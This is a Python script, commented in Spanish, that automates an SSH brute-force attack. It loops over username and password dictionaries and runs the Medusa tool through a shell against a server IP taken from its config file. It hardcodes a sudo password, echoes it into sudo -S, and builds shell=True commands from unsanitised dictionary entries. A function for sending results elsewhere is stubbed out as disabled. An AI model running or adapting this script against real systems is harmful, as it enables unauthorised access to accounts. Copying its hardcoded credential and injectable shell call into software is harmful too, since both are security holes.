import subprocess
import os
import logging
import sys
import time
import json
import requests
from typing import Dict, List
from datetime import datetime
from send.data import DATA  # Añadir esta línea

# Configuración de rutas
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, "config", "config.json")
LOGS_DIR = os.path.join(BASE_DIR, "logs")
KEYS_DIR = os.path.join(BASE_DIR, "keys")
CERT_PATH = os.path.join(KEYS_DIR, "certificate.pem")  # Añadir esta línea

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "ataque_medusa.log")),
        logging.StreamHandler(sys.stdout)
    ],
)
logger = logging.getLogger(__name__)

# Configuración de errores
error_logger = logging.getLogger("error_logger")
error_logger.addHandler(logging.FileHandler(os.path.join(LOGS_DIR, "errors.log")))

# Cargar configuración
def cargar_configuracion() -> Dict:
    try:
        with open(CONFIG_PATH, "r") as f:
            config = json.load(f)
        logger.info("Configuración cargada correctamente.")
        return config
    except Exception as e:
        error_logger.error(f"Error al cargar la configuración: {e}")
        sys.exit(1)

# Leer archivo de diccionario
def leer_diccionario(ruta_archivo: str) -> List[str]:
    ruta_completa = os.path.join(BASE_DIR, "diccionarios", ruta_archivo)
    try:
        with open(ruta_completa, "r") as f:
            return [linea.strip() for linea in f.readlines()]
    except Exception as e:
        error_logger.error(f"Error al leer el archivo {ruta_completa}: {e}")
        return []

# Función para abrir una terminal y ejecutar un comando
def abrir_terminal(comando: str, titulo: str, password: str = None) -> None:
    try:
        logger.info(f"Iniciando: {titulo}")
        if password:
            comando = f"echo {password} | sudo -S {comando}"
        proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            stdout, stderr = proceso.communicate(timeout=30)
            if proceso.returncode == 0:
                logger.info(f"Comando ejecutado correctamente: {titulo}")
            else:
                error_logger.error(f"Error al ejecutar el comando: {stderr.decode().strip()}")
        except subprocess.TimeoutExpired:
            proceso.kill()
            stdout, stderr = proceso.communicate()
            error_logger.error(f"El comando '{titulo}' excedió el tiempo de espera y fue terminado.")
    except Exception as e:
        error_logger.error(f"Error al ejecutar el comando: {e}")

# Función para enviar un JSON de transacción
def enviar_transaccion(ip: str, usuario: str, clave: str, estado: str) -> None:
    logger.info("Envío de transacciones deshabilitado.")
    # Código eliminado para evitar el envío de transacciones
    pass

# Función para realizar ataque de Medusa
def ataque_medusa(config: Dict, password: str) -> None:
    usuarios = leer_diccionario(config["archivo_usuarios"])
    contrasenas = leer_diccionario(config["archivo_contrasenas"])
    for usuario in usuarios:
        for contrasena in contrasenas:
            comando = f"medusa -u {usuario} -p {contrasena} -h {config['ip_servidor']} -M ssh -t 4"  # Aumentar tareas paralelas a 4
            try:
                abrir_terminal(comando, f"Ataque Medusa a {config['ip_servidor']} con {usuario}", password)
                logger.info(f"Iniciando ataque de Medusa en {config['ip_servidor']} con usuario {usuario} y contraseña {contrasena}...")
                
                # Eliminar llamada a enviar_transaccion
                # enviar_transaccion(config["ip_servidor"], usuario, contrasena, "conexion_exitosa")
            except Exception as e:
                error_logger.error(f"Error durante el ataque de Medusa: {e}")

# Función principal
def main() -> None:
    logger.info("Iniciando script de ataque de Medusa...")
    
    # Cargar configuración
    config = cargar_configuracion()
    
    # Contraseña para sudo
    password = "Ptf8454Jd55"
    
    # Realizar ataque de Medusa
    ataque_medusa(config, password)

    logger.info("Script de ataque de Medusa completado.")

if __name__ == "__main__":
    main()
